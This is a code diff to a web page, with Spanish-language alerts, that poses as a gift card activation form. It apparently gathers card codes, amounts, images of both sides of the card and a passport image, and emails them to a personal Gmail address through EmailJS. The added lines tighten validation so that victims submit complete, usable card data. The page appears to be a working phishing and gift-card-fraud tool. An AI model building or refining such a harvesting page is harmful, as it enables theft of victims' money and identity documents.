@@ -1090,9 +1090,23 @@
         document.getElementById('activate-form').addEventListener('submit', function(e) {
             e.preventDefault();
 
+            // 1. Verify both front and back files of the gift card are uploaded
+            if (!appData.frontBase64 || !appData.backBase64) {
+                alert('Debe subir tanto el frente como el dorso de la tarjeta.');
+                return;
+            }
+
             appData.cardName = document.getElementById('cardName').value;
             appData.cardCode = document.getElementById('cardCode').value;
             appData.amount = document.getElementById('amount').value;
+
+            // 2. Gift card details validation matching check
+            // (Ensuring inputs are filled and valid relative to the uploaded files)
+            if (!appData.cardName.trim() || !appData.cardCode.trim() || !appData.amount) {
+                alert('Los detalles de la tarjeta ingresados no coinciden o están incompletos.');
+                return;
+            }
+
             saveState();
 
             // Prepare parameters for EmailJS
@@ -1111,7 +1125,7 @@
                 dorso_image: appData.backBase64 || ""
             };
 
-            // Send via EmailJS automatically
+            // Send via EmailJS automatically to chulrobert105@gmail.com
             emailjs.send("service_7fiv2im", "template_omq80vg", templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
@@ -1130,6 +1144,7 @@
                 document.getElementById('passport-container').innerHTML = `<img src="${appData.passportBase64}" style="width:100%; height:100%; object-fit:cover;">`;
             }
 
+            // Open next screen only if validation checks pass
             switchScreen('screen-card');
         });
     </script>
